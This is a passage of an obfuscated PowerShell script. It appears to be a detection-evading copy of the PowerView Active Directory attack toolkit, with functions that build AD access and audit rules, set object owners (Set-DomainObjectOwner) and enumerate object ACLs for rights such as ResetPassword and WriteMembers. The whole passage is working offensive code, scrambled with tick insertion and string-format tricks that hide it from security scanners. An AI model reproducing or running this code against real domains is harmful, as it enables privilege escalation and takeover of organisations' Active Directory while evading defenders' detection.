        ${IDE`N`TiTY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${OBj`eC`TsID})
    }

    Process {
        if(${p`sCmdl`eT}.PARAMEteRSetNAMe -eq ("{2}{1}{0}" -f 'Type','Rule','Audit')) {

            if(${oBJeCt`T`yPe} -eq ${nU`Ll} -and ${iNh`E`RITAncety`Pe} -eq   ( GEt-variaBlE ("Z5W"+"nb")  -vAlUeOn  )::"eMP`Ty" -and ${I`NHer`ItEdoB`JeC`TtYpe} -eq ${N`Ull}) {
                &("{0}{3}{2}{1}" -f'Ne','ect','bj','w-O') ("{2}{4}{3}{5}{6}{10}{8}{11}{1}{9}{7}{0}" -f'tRule','ctory','Sy','ire','stem.D','ctoryServ','ice','di','ir','Au','s.ActiveD','e') -ArgumentList ${iDEn`TI`TY}, ${Ad`R`IGHt}, ${AUd`iTfL`Ag}
            } elseif(${ObJE`Ctt`ypE} -eq ${n`ULL} -and ${I`NH`EriT`A`N`CeTYPe} -ne  (ItEM VARiAblE:Z5wNb ).VALue::"E`MPTY" -and ${INh`eriteD`OBjE`C`TtypE} -eq ${nu`lL}) {
                &("{1}{2}{3}{0}"-f 'ect','Ne','w-','Obj') ("{0}{13}{9}{10}{7}{3}{11}{4}{1}{2}{5}{8}{6}{12}" -f 'S','e','ctor','c','r','y','l','ctoryServi','AuditRu','stem.Dir','e','es.ActiveDi','e','y') -ArgumentList ${I`d`ENtitY}, ${aDr`ig`ht}, ${a`U`DItFLAg}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`Nhe`RI`TaNcET`YpE})
            } elseif(${o`BJECTtY`pe} -eq ${nU`ll} -and ${In`heRItAn`cEt`YPE} -ne   ( vArIABle ("Z5WN"+"b") -VaLuE)::"Emp`Ty" -and ${iN`herit`edO`BjECt`T`yPE} -ne ${n`ULL}) {
                &("{0}{2}{3}{1}" -f'New-','ct','O','bje') ("{4}{7}{1}{6}{3}{8}{0}{2}{5}{9}"-f 'to','t','ryA','vice','S','uditRu','orySer','ystem.Direc','s.ActiveDirec','le') -ArgumentList ${iD`e`NtITy}, ${AD`RIGHt}, ${aUdi`Tfl`AG}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${iNHER`itANcetY`PE}), ${iNh`eRiTeDOBJ`E`Ct`Ty`Pe}
            } elseif(${oBJEct`TY`PE} -ne ${nU`lL} -and ${I`NhE`RI`TanCEt`YpE} -eq  ( gEt-varIABlE  z5WNb  ).VaLUe::"E`mPTy" -and ${INH`ERIt`Edo`Bj`eCTtypE} -eq ${N`ULL}) {
                &("{1}{3}{0}{2}"-f'je','New-O','ct','b') ("{5}{4}{6}{7}{1}{3}{0}{2}"-f 'rectoryAuditRul','rv','e','ices.ActiveDi','yste','S','m.D','irectorySe') -ArgumentList ${iD`ENt`itY}, ${aDr`ig`HT}, ${au`D`IT`FlaG}, ${obj`ecT`TYpE}
            } elseif(${OBjE`CTT`YPE} -ne ${NU`ll} -and ${I`NHeR`ITAnCEtype} -ne  ( get-VArIAblE  Z5wnb  -valueON )::"EM`PTy" -and ${in`HERi`TedoB`jeCTTY`PE} -eq ${n`ULl}) {
                &("{1}{2}{3}{0}"-f 't','N','e','w-Objec') ("{1}{3}{5}{2}{6}{10}{0}{8}{9}{4}{11}{7}" -f's','S','em','y','veDirecto','st','.DirectoryServi','le','.A','cti','ce','ryAuditRu') -ArgumentList ${i`Denti`TY}, ${ad`R`igHT}, ${aUD`I`TfLAg}, ${o`BjECtt`Y`pe}, ${InheRiT`A`NceT`y`pE}
            } elseif(${O`Bject`Ty`pE} -ne ${n`UlL} -and ${i`N`hE`RITaNCETY`pe} -ne  ( GI ("VAr"+"Ia"+"ble:z5wn"+"b")  ).valUE::"E`MPtY" -and ${iNhErIteDOB`Ject`T`Y`Pe} -ne ${NU`Ll}) {
                &("{1}{2}{0}{3}"-f'bjec','N','ew-O','t') ("{0}{6}{8}{3}{1}{10}{9}{4}{2}{5}{7}"-f'S','ices.Act','yAud','.DirectoryServ','ctor','i','yst','tRule','em','Dire','ive') -ArgumentList ${I`DEnTity}, ${ad`RI`ghT}, ${au`dIT`FLag}, ${o`BJECTT`Y`Pe}, ${INherIta`N`c`etypE}, ${INhEr`ItEd`oBJEC`TtYPe}
            }

        }
        else {

            if(${ObjEcTt`Y`PE} -eq ${n`Ull} -and ${INH`e`RiTAN`C`eTYpe} -eq  $z5WNB::"EmP`Ty" -and ${i`NH`ERIted`o`Bj`EctType} -eq ${Nu`lL}) {
                &("{2}{0}{1}{3}"-f'Ob','je','New-','ct') ("{8}{5}{2}{13}{12}{4}{10}{0}{7}{6}{9}{3}{11}{1}" -f 'Ac','e','.Dire','irect','ryServic','ystem','v','ti','S','eD','es.','oryAccessRul','to','c') -ArgumentList ${IDE`NtitY}, ${aDrI`G`hT}, ${AcC`e`sS`contR`OLTYpE}
            } elseif(${OB`jE`CtTY`pE} -eq ${Nu`Ll} -and ${i`NHErIt`Anc`ET`ypE} -ne  $Z5wnb::"EM`PTy" -and ${inHe`R`ItedoBjECtT`y`pE} -eq ${NU`ll}) {
                &("{1}{0}{2}" -f'ew-Ob','N','ject') ("{5}{3}{0}{7}{6}{2}{4}{1}{8}" -f'ic','sRu','re','ryServ','ctoryAcces','System.Directo','veDi','es.Acti','le') -ArgumentList ${I`DEn`Tity}, ${A`Dr`IGHt}, ${a`cC`ES`ScoNtRolt`YPE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${inH`E`R`itaNcETYpe})
            } elseif(${o`Bj`ECtt`YPE} -eq ${nU`LL} -and ${i`NHE`RIt`AnCE`Ty`pE} -ne   (VARIaBLe  z5WnB -vAlUe )::"Em`Pty" -and ${INhErIT`E`do`Bje`Cttype} -ne ${Nu`Ll}) {
                &("{0}{1}{2}" -f 'New-','O','bject') ("{9}{6}{4}{2}{8}{7}{3}{1}{0}{5}{10}" -f 'toryAccess','ec','s.','veDir','Service','Rul','Directory','i','Act','System.','e') -ArgumentList ${id`EN`T`ItY}, ${A`dri`gHt}, ${ACC`Essc`oN`T`RoLTyPE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${INH`eri`Ta`N`cEt`Ype}), ${InhEriteD`obj`e`cTtyPe}
            } elseif(${o`BJeC`T`Type} -ne ${nU`lL} -and ${I`Nh`ERitA`NCe`TyPE} -eq  $Z5WNB::"E`MPTy" -and ${InHEri`TEDO`B`JE`C`TTy`pE} -eq ${nu`lL}) {
                &("{1}{2}{0}" -f 'bject','Ne','w-O') ("{9}{13}{5}{12}{3}{6}{11}{4}{10}{1}{14}{0}{8}{7}{2}"-f 'Ac','irect','le','vi','ctiv','em.Di','c','sRu','ces','Sy','eD','es.A','rectorySer','st','ory') -ArgumentList ${ideN`T`Ity}, ${Ad`RIG`HT}, ${accEs`sc`ON`TRolty`pe}, ${O`Bj`eCttypE}
            } elseif(${oBJEcTT`Y`Pe} -ne ${nU`LL} -and ${I`NH`erI`TaNc`e`TypE} -ne   (  Get-CHildiTEm Variable:z5WNB  ).valUE::"eM`ptY" -and ${iNhE`RI`T`edobjecTtyPe} -eq ${NU`Ll}) {
                &("{1}{3}{0}{2}"-f 'jec','New','t','-Ob') ("{2}{6}{10}{11}{5}{12}{3}{1}{7}{9}{4}{0}{8}"-f 'Ac','t','Syste','ec','y','s','m.Directory','o','cessRule','r','Serv','ice','.ActiveDir') -ArgumentList ${ID`en`Tity}, ${Ad`R`Ight}, ${acCEsSCon`TrO`lT`Ype}, ${Ob`jec`TTy`pe}, ${In`H`E`RItanC`EtYpE}
            } elseif(${o`BjE`Ct`Type} -ne ${N`ULl} -and ${InHeRI`T`AN`cE`TYpe} -ne   $z5wnB::"EMP`Ty" -and ${INhEriTed`ob`JEC`TTy`pE} -ne ${n`ULl}) {
                &("{0}{2}{1}" -f 'Ne','ct','w-Obje') ("{3}{10}{0}{4}{2}{7}{8}{5}{1}{9}{6}"-f 'm.Directory','e','vices.Activ','Sys','Ser','ryAcc','le','eDirect','o','ssRu','te') -ArgumentList ${id`ENT`ItY}, ${AD`R`iGht}, ${ACc`eSSC`OntRo`L`Ty`pE}, ${oBjEc`TT`YPE}, ${iNH`eRitanCe`TYPE}, ${i`NheR`iTEDobJEcT`TypE}
            }

        }
    }
}


function SeT-dOMAI`NoBject`ow`NER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{6}{5}{1}{4}{2}"-f'PSUse','ang','tions','ShouldProcessForState','ingFunc','h','C'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f 'PS','Sh','cess','ouldPro'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItIOn = 0, MAndatORy = ${T`RUE}, ValUEfRoMpiPeLine = ${t`RuE}, vALUefrOmpIpelINeBYPrOpErTYName = ${tr`Ue})]
        [Alias({"{0}{2}{3}{1}" -f'D','ishedName','isti','ngu'}, {"{4}{1}{0}{2}{3}" -f't','n','N','ame','SamAccou'}, {"{0}{1}"-f 'Nam','e'})]
        [String]
        ${i`de`N`TIty},

        [Parameter(mandaTory = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'r','Owne'})]
        [String]
        ${oWN`eriDe`N`TIty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'r','lte','Fi'})]
        [String]
        ${Lda`P`FIl`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'DSPath','A'})]
        [String]
        ${Se`A`RcH`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}"-f 'roll','D','omainCont','er'})]
        [String]
        ${s`er`VEr},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{2}{1}{0}" -f 'el','Lev','One'}, {"{0}{1}"-f 'Su','btree'})]
        [String]
        ${sE`ARcHScO`pE} = ("{1}{0}" -f 'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsULTP`AgE`sI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERVE`RtiMeL`iM`iT},

        [Switch]
        ${To`mb`STOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`D`entI`Al} =   ( DiR ('va'+'r'+'iaBle:21gV'+'7e') ).Value::"em`PTy"
    )

    BEGIN {
        ${sea`RCHE`Rar`G`UMENTS} = @{}
        if (${P`sb`o`UndPaRamEteRS}[("{1}{2}{0}"-f 'in','Dom','a')]) { ${SEa`RchER`ARguM`eNTs}[("{1}{0}"-f 'in','Doma')] = ${dOM`AIn} }
        if (${pSb`OuNdpA`R`AmeTErS}[("{1}{3}{2}{0}"-f'ter','LDA','il','PF')]) { ${SEa`RC`HE`RArGu`Ments}[("{1}{0}{2}"-f 'Fil','LDAP','ter')] = ${Ld`AP`Fi`lter} }
        if (${PS`BOun`dpaR`AMetErS}[("{0}{1}{2}"-f 'Sea','rc','hBase')]) { ${seaRc`h`eRAR`G`UmeNTS}[("{1}{2}{3}{0}" -f'hBase','S','ea','rc')] = ${se`A`RchBa`se} }
        if (${p`sBO`UNdPAraME`Te`Rs}[("{0}{2}{1}"-f 'Serv','r','e')]) { ${S`eAR`CHeR`ARGum`ENTs}[("{0}{1}" -f'Ser','ver')] = ${s`erv`er} }
        if (${psbo`UnDPAr`AMe`TErS}[("{1}{2}{0}" -f 'pe','Searc','hSco')]) { ${SE`AR`c`hER`ArguMen`TS}[("{1}{2}{0}" -f 'e','Sea','rchScop')] = ${se`ARCHS`C`Ope} }
        if (${P`SbOundp`ARaM`ETerS}[("{2}{1}{4}{0}{3}" -f 'Si','l','Resu','ze','tPage')]) { ${searc`h`e`RA`RgUMents}[("{2}{3}{0}{1}" -f'iz','e','R','esultPageS')] = ${RE`S`Ultpag`ESizE} }
        if (${pS`B`oundPARamET`e`RS}[("{2}{1}{3}{0}" -f'Limit','erTi','Serv','me')]) { ${SE`AR`C`herarg`UMeNTs}[("{4}{3}{2}{1}{0}" -f 'Limit','ime','verT','er','S')] = ${sE`RVE`Rti`mElI`mIt} }
        if (${ps`BO`UndPa`RameteRs}[("{1}{0}{2}"-f 'm','To','bstone')]) { ${Se`A`RcHERA`RGumeN`TS}[("{1}{0}{2}"-f'o','Tombst','ne')] = ${t`omBst`oNE} }
        if (${PSbo`UNd`PaRaME`TERs}[("{3}{2}{0}{1}" -f 'tia','l','n','Crede')]) { ${seARcHe`RA`RG`Um`ents}[("{1}{0}{2}" -f 'nt','Crede','ial')] = ${crEd`Ent`IAl} }

        ${oWNer`s`Id} = &("{2}{3}{0}{4}{1}{5}" -f 'ai','O','Get-','Dom','n','bject') @SearcherArguments -Identity ${O`Wneri`Den`TiTY} -Properties ("{1}{0}{2}" -f 'ct','obje','sid') | &("{0}{2}{3}{1}" -f'Se','Object','le','ct-') -ExpandProperty ("{0}{2}{1}"-f 'objects','d','i')
        if (${owne`RsiD}) {
            ${O`w`NERiDEn`TITyrEF`e`REN`ce} = [System.Security.Principal.SecurityIdentifier]${owne`R`SiD}
        }
        else {
            &("{0}{2}{3}{1}" -f'Write-War','g','ni','n') ('['+'Set'+'-Doma'+'inObjectOwner'+'] '+'Err'+'or '+'p'+'arsing'+' '+'owner'+' '+'iden'+'t'+'i'+'ty '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if (${OWN`eRi`DEN`TITyREf`eR`e`Nce}) {
            ${SEARchErAR`GU`m`ents}['Raw'] = ${t`RuE}
            ${SeArCH`ErAR`GuMEN`TS}[("{0}{1}"-f'Identi','ty')] = ${I`dEn`TIty}

            
            ${rawO`BJ`ECT} = &("{0}{3}{1}{2}{4}"-f'Get-','O','bjec','Domain','t') @SearcherArguments

            ForEach (${objE`Ct} in ${raWobJ`e`CT}) {
                try {
                    &("{2}{1}{0}{3}"-f 'V','te-','Wri','erbose') ('[Se'+'t'+'-D'+'om'+'ainObj'+'ec'+'tOwner] '+'A'+'tte'+'mpting '+'t'+'o '+'se'+'t '+'th'+'e '+'ow'+'n'+'er '+'for'+' '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    ${En`Try} = ${RAw`o`BJECt}.("{4}{0}{1}{3}{5}{2}"-f'D','irect','yEntry','o','Get','r').Invoke()
                    ${En`T`Ry}."P`s`BAse"."Opt`IonS"."Se`Cu`R`ITyMaSKS" = ("{1}{0}"-f'r','Owne')
                    ${En`Try}."P`SbA`Se"."OB`JEcTS`ec`U`RItY".("{1}{0}{2}"-f'wn','SetO','er').Invoke(${o`WNERIDENtiT`Yr`eFe`R`EncE})
                    ${E`NT`Ry}."p`sBaSe".("{0}{1}{3}{2}"-f'C','om','es','mitChang').Invoke()
                }
                catch {
                    &("{2}{0}{3}{1}"-f 'r','ng','W','ite-Warni') ('[Set-Dom'+'ainO'+'bjectOwn'+'er'+'] '+'Error'+' '+'s'+'etti'+'ng '+'owner:'+' '+"$_")
                }
            }
        }
    }
}


function GET-doMaInOB`Jec`TA`CL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f'PS','S','ocess','houldPr'}, '')]
    [OutputType({"{2}{0}{3}{1}" -f 'r','iew.ACL','Powe','V'})]
    [CmdletBinding()]
    Param (
        [Parameter(PositiON = 0, vAlUefROmPIpElINe = ${Tr`UE}, vaLuEfROmpIPELInEbYPRopERTynaME = ${Tr`Ue})]
        [Alias({"{0}{2}{4}{3}{1}" -f 'Disti','ame','ng','hedN','uis'}, {"{2}{0}{1}{3}" -f 'Acc','oun','Sam','tName'}, {"{0}{1}"-f'Nam','e'})]
        [String[]]
        ${i`DE`NtiTy},

        [Switch]
        ${S`AcL},

        [Switch]
        ${r`e`SOLvEgu`IdS},

        [String]
        [Alias({"{0}{1}"-f 'R','ights'})]
        [ValidateSet('All', {"{0}{3}{1}{4}{2}" -f 'R','s','assword','e','etP'}, {"{1}{2}{0}" -f 'rs','Wr','iteMembe'})]
        ${r`iGh`TsF`iLTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMa`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filt','er'})]
        [String]
        ${l`D`APFI`lTER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'SPat','h','AD'})]
        [String]
        ${sEA`RcH`Ba`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{2}{3}{0}" -f'er','ai','nCont','roll','Dom'})]
        [String]
        ${SErv`er},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{1}"-f'On','eLevel'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${sear`c`h`SCoPe} = ("{2}{0}{1}" -f'ubtr','ee','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`E`sul`TpaGEs`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErv`e`RTIMe`LIM`iT},

        [Switch]
        ${TO`mBS`TOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDEnt`ial} =   (gI  ("VA"+"riAblE:"+"2"+"1gv7e")).VaLUe::"e`mpTy"
    )

    BEGIN {
        ${sEarCh`eraRG`U`MEntS} = @{
            ("{1}{2}{0}" -f'ies','Prop','ert') = ("{0}{1}{4}{6}{9}{5}{7}{3}{8}{2}"-f'samaccountna','me,ntsecur','id',',','itydes','na','criptor,di','me','objects','stinguished')
        }

        if (${P`s`Bou`NdpAr`AMetErs}[("{1}{0}" -f 'cl','Sa')]) {
            ${seaRc`hErA`RG`UmeN`Ts}[("{2}{1}{0}{3}" -f 'Mas','urity','Sec','ks')] = ("{1}{0}" -f 'cl','Sa')
        }
        else {
            ${se`ARcHEra`RGU`meNTs}[("{0}{4}{1}{2}{3}"-f 'S','cur','i','tyMasks','e')] = ("{0}{1}" -f'Dac','l')
        }
        if (${pSBoUnDP`A`Ra`METers}[("{1}{0}" -f'main','Do')]) { ${SearChER`Ar`gumE`NTS}[("{0}{1}"-f'D','omain')] = ${do`mA`IN} }
        if (${pSb`oUNdpar`AmE`T`eRS}[("{0}{1}{2}" -f'Sear','c','hBase')]) { ${seaRCH`eR`ARgUmE`NTs}[("{0}{2}{1}"-f 'Se','chBase','ar')] = ${sEARch`BA`sE} }
        if (${P`sBO`U`NdpAraM`ETeRS}[("{0}{1}" -f'Ser','ver')]) { ${S`EArCHer`AR`gU`MEn`TS}[("{0}{1}" -f 'Serve','r')] = ${s`E`RVeR} }
        if (${p`SB`O`UN`Dp`ArAMeTeRs}[("{3}{0}{1}{2}" -f'e','ar','chScope','S')]) { ${S`Ea`RcHeRArg`UmenTs}[("{2}{1}{0}"-f'chScope','ar','Se')] = ${SEArCH`sc`opE} }
        if (${PS`BoundPar`AMe`TeRS}[("{2}{1}{0}{3}" -f 'g','ltPa','Resu','eSize')]) { ${sEA`Rc`H`ERaR`GUM`eNTS}[("{1}{4}{3}{2}{0}"-f'e','Resu','z','tPageSi','l')] = ${ReS`ULT`P`AGesize} }
        if (${pSB`O`UN`dPARA`mete`Rs}[("{3}{0}{1}{2}" -f'TimeLi','m','it','Server')]) { ${sEARChE`RARg`U`mE`NtS}[("{2}{1}{0}"-f 'rTimeLimit','rve','Se')] = ${SeR`VE`RTImEL`I`MiT} }
        if (${Ps`Bo`UNDpar`Ame`TerS}[("{1}{2}{0}" -f'e','Tombsto','n')]) { ${sEA`R`cH`E`RargumenTs}[("{0}{2}{1}"-f'T','ne','ombsto')] = ${t`omB`StOne} }
        if (${p`sBOunDP`Aram`et`E`Rs}[("{2}{0}{1}"-f 'edentia','l','Cr')]) { ${SE`A`RCHerarGumE`N`Ts}[("{3}{2}{1}{0}"-f'ial','t','reden','C')] = ${CredEn`Ti`Al} }
        ${sEa`RCH`ER} = &("{4}{2}{1}{3}{0}"-f'er','ainSe','et-Dom','arch','G') @SearcherArguments

        ${DomaInGu`idmaPa`RgU`mEn`Ts} = @{}
        if (${PS`BOun`d`p`ARA`metERs}[("{1}{0}" -f'omain','D')]) { ${dOm`AiNguIdM`A`paR`gumENtS}[("{1}{2}{0}" -f'n','Do','mai')] = ${d`Oma`in} }
        if (${pS`BouND`param`ETE`RS}[("{1}{0}"-f 'r','Serve')]) { ${d`OmA`inGUidma`Pa`RGUmEnts}[("{0}{1}"-f'Se','rver')] = ${S`eRVeR} }
        if (${pSBouN`D`paRa`MetErs}[("{2}{3}{0}{1}" -f 'geSiz','e','ResultP','a')]) { ${dOMA`ing`Ui`DmapArG`UmE`NtS}[("{3}{2}{0}{1}"-f'tP','ageSize','l','Resu')] = ${re`s`UL`TPAgEsIze} }
        if (${PsB`ouN`dpArAmEt`E`RS}[("{4}{0}{3}{1}{2}"-f 'r','i','mit','TimeL','Serve')]) { ${dOmAINgUi`dm`ApArguME`NtS}[("{2}{1}{3}{0}" -f'it','erTimeL','Serv','im')] = ${Se`RVErTi`m`eLIM`It} }
        if (${psbo`U`N`Dp`ArAME`Ters}[("{1}{2}{0}"-f 'ial','Crede','nt')]) { ${domA`IN`GUIdMa`PaRG`U`M`EnTS}[("{2}{1}{3}{0}"-f 'l','eden','Cr','tia')] = ${Cr`edE`N`TiAL} }

        
        if (${pSBOU`NdPARAm`E`TeRs}[("{3}{0}{2}{1}"-f 'veGU','Ds','I','Resol')]) {
            ${G`U`idS} = &("{4}{1}{0}{3}{2}"-f'in','-Doma','Map','GUID','Get') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${SEa`R`Ch`eR}) {
            ${Id`eNt`ITyFi`L`TeR} = ''
            ${fI`lT`eR} = ''
            ${iD`EnTITy} | &("{1}{2}{3}{0}" -f '-Object','W','he','re') {${_}} | &("{4}{1}{0}{3}{2}"-f 'ach-O','rE','t','bjec','Fo') {
                ${ID`entI`TY`iNsT`ANcE} = ${_}.("{0}{2}{1}" -f 'R','ace','epl').Invoke('(', '\28').("{1}{0}" -f'ce','Repla').Invoke(')', '\29')
                if (${iDeNtit`y`insT`AnCE} -match ("{1}{0}" -f'-.*','^S-1')) {
                    ${iDenTi`TyF`i`LT`Er} += "(objectsid=$IdentityInstance)"
                }
                elseif (${idEntitYI`Nst`AN`Ce} -match ((("{4}{1}{0}{2}{3}"-f '5DC)','x','=','.*','^(CNlx5OUl'))."reP`l`ACe"(([char]108+[char]120+[char]53),[sTrINg][char]124))) {
                    ${i`DeNt`i`TYFiLTER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSBOunD`P`Ar`Ame`TeRs}[("{0}{1}" -f'Do','main')]) -and (-not ${PSB`ou`NdpaRa`M`ETeRS}[("{1}{2}{0}" -f 'se','Searc','hBa')])) {
                        
                        
                        ${ide`Ntit`YdoMaiN} = ${I`De`Nt`ITyin`sTANcE}.("{0}{2}{1}" -f 'S','ng','ubStri').Invoke(${iDentityI`N`s`TANCe}.("{0}{1}"-f'IndexO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{2}{1}" -f'Wr','Verbose','ite-') ('['+'Ge'+'t-Do'+'mainOb'+'je'+'ctAcl] '+'Extrac'+'te'+'d '+'d'+'oma'+'in '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${searChe`R`ArGumeN`Ts}[("{0}{1}"-f'Domai','n')] = ${id`e`NTiTyDOMA`In}
                        ${s`EA`RChEr} = &("{3}{0}{2}{1}" -f 'omainSear','r','che','Get-D') @SearcherArguments
                        if (-not ${sea`RCheR}) {
                            &("{3}{2}{0}{1}"-f'arn','ing','te-W','Wri') ('[Get-'+'Doma'+'inObj'+'ec'+'tAcl]'+' '+'U'+'nabl'+'e '+'to'+' '+'retrie'+'ve '+'d'+'om'+'ain '+'sear'+'che'+'r '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${I`DEn`Tity`INSta`NCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${GU`IdBy`Te`St`RinG} = (([Guid]${IdEN`T`itYInsTa`NcE}).("{2}{0}{1}{3}"-f'oB','yteAr','T','ray').Invoke() | &("{3}{1}{2}{0}" -f'bject','-','O','ForEach') { '\' + ${_}.("{2}{1}{0}" -f'g','n','ToStri').Invoke('X2') }) -join ''
                    ${IdeNTITy`FI`lT`er} += "(objectguid=$GuidByteString)"
                }
                elseif (${IDe`N`TI`TyiN`sTanCe}.("{0}{1}"-f'Conta','ins').Invoke('.')) {
                    ${IDeNt`It`yFilT`er} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${ide`NtI`TyFiL`TeR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${IdeNT`IT`YfI`lT`er} -and (${IDe`N`T`ityFiLt`ER}.("{1}{0}" -f'im','Tr').Invoke() -ne '') ) {
                ${fILt`er} += "(|$IdentityFilter)"
            }

            if (${pSB`O`UNdpARAM`E`Ters}[("{2}{0}{1}" -f 'DAPF','ilter','L')]) {
                &("{1}{0}{2}{3}" -f 'ite-','Wr','Ver','bose') ('[G'+'et-Do'+'mainObjec'+'tA'+'cl] '+'Us'+'ing '+'addition'+'a'+'l '+'LD'+'AP '+'f'+'ilt'+'er: '+"$LDAPFilter")
                ${fI`lter} += "$LDAPFilter"
            }

            if (${F`IlT`eR}) {
                ${S`ea`R`ChEr}."f`IltEr" = "(&$Filter)"
            }
            &("{3}{4}{1}{2}{0}" -f 'e','Verbo','s','W','rite-') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            ${r`eSuL`TS} = ${sEAr`CHER}.("{1}{2}{0}"-f'll','Fi','ndA').Invoke()
            ${R`ESul`Ts} | &("{2}{3}{1}{0}"-f't','jec','Wher','e-Ob') {${_}} | &("{2}{0}{1}"-f 'h-','Object','ForEac') {
                ${OB`J`ECT} = ${_}."PRo`pert`i`eS"

                if (${Obj`E`Ct}."O`BJEC`TSID" -and ${o`BjE`Ct}."Obje`ct`sid"[0]) {
                    ${ob`JEcts`id} = (&("{3}{2}{1}{0}"-f 't','jec','-Ob','New') ("{4}{1}{0}{6}{5}{2}{3}{7}"-f'ity','em.Secur','ipal.Sec','urity','Syst','inc','.Pr','Identifier')(${O`BJECT}."Ob`JeCt`sid"[0],0))."VA`lue"
                }
                else {
                    ${objeC`TS`id} = ${N`Ull}
                }

                try {
                    &("{0}{1}{2}"-f 'N','e','w-Object') ("{3}{1}{4}{6}{7}{2}{0}{5}" -f 'cri','rity.Ac','rityDes','Secu','c','ptor','essCon','trol.RawSecu') -ArgumentList ${Ob`jECt}[("{1}{0}{2}{3}{4}" -f 'itydesc','ntsecur','rip','t','or')][0], 0 | &("{1}{3}{0}{2}" -f'-Ob','F','ject','orEach') { if (${p`SboUND`pA`RaMetErs}[("{1}{0}" -f'l','Sac')]) {${_}."SYstE`MA`CL"} else {${_}."di`sCRe`T`ioNARYAcl"} } | &("{2}{0}{3}{4}{1}" -f'or','ect','F','Each-','Obj') {
                        if (${PSbouN`dp`AR`Am`eTerS}[("{1}{2}{0}{3}" -f'sFilt','Righ','t','er')]) {
                            ${gui`dFI`lTER} = Switch (${rigHTs`F`il`TEr}) {
                                ("{3}{1}{0}{2}"-f'ass','P','word','Reset') { ("{6}{7}{4}{2}{3}{0}{1}{5}"-f'aa','0','a768','-00','-','06e0529','00299570-246d-','11d0') }
                                ("{1}{3}{2}{0}"-f 'teMembers','W','i','r') { ("{3}{2}{1}{10}{5}{9}{0}{7}{4}{8}{6}"-f'0aa','679c0','f9','b','030','-','e2','0','49','11d0-a285-0','-0de6') }
                                ("{1}{2}{0}"-f 'ult','Def','a') { ("{7}{8}{6}{4}{3}{1}{2}{0}{5}"-f '0-000000','00-0','000-000','0','0','000000','-','000','00000') }
                            }
                            if (${_}."o`BJeC`TtyPE" -eq ${g`UiDFil`T`ER}) {
                                ${_} | &("{0}{1}{2}" -f'Add','-','Member') ("{1}{3}{0}{2}"-f't','NotePrope','y','r') ("{2}{1}{0}" -f 'N','bjectD','O') ${ob`j`eCt}."DiS`Ting`UI`ShE`dnAMe"[0]
                                ${_} | &("{1}{0}{2}" -f 'Membe','Add-','r') ("{2}{3}{0}{1}" -f'roper','ty','No','teP') ("{0}{1}{2}"-f 'O','bject','SID') ${OBJEc`TS`ID}
                                ${CoN`TI`NuE} = ${T`RUE}
                            }
                        }
                        else {
                            ${_} | &("{0}{1}{2}"-f 'Add','-Membe','r') ("{3}{0}{2}{1}" -f 'p','y','ert','NotePro') ("{2}{0}{1}" -f 'ec','tDN','Obj') ${obj`ECT}."D`is`T`i`NgUish`EDnaMe"[0]
                            ${_} | &("{1}{3}{2}{0}"-f'r','A','Membe','dd-') ("{2}{1}{0}" -f 'rty','ope','NotePr') ("{1}{0}"-f 'SID','Object') ${oBJ`eCtS`Id}
                            ${COnTi`NuE} = ${tr`Ue}
                        }

                        if (${co`Nt`INUe}) {
                            ${_} | &("{1}{0}{2}" -f'e','Add-M','mber') ("{2}{1}{0}{3}"-f 'Proper','e','Not','ty') ("{2}{1}{4}{3}{0}"-f 'ryRights','ctiveDire','A','o','ct') (  ( LS ("v"+"aRI"+"A"+"Bl"+"E:6HEI4")).VALUE::"Toob`J`Ect"([System.DirectoryServices.ActiveDirectoryRights], ${_}."acCE`SS`M`Ask"))
                            if (${gu`ids}) {
                                
                                ${a`c`LPropERTIes} = @{}
                                ${_}."Ps`ob`jEct"."pro`PErT`IES" | &("{1}{2}{0}"-f 't','ForEach-','Objec') {
